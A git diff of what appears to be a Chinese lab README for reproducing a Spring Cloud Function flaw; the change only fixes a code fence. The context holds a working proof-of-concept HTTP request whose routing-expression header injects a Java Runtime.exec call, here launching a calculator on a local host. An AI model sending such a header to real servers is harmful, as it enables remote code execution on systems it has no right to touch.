@@ -4,7 +4,8 @@
 \
 搭建完成访问127.0.0.1:8080端口\
 ![image](https://user-images.githubusercontent.com/88339946/160252763-dcdab609-08a5-4d70-afb0-0f8870d64f82.png)
-```POST /xxx HTTP/1.1
+```
+POST /xxx HTTP/1.1
 Host: 127.0.0.1:8080
 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
 Content-Type: application/x-www-form-urlencoded
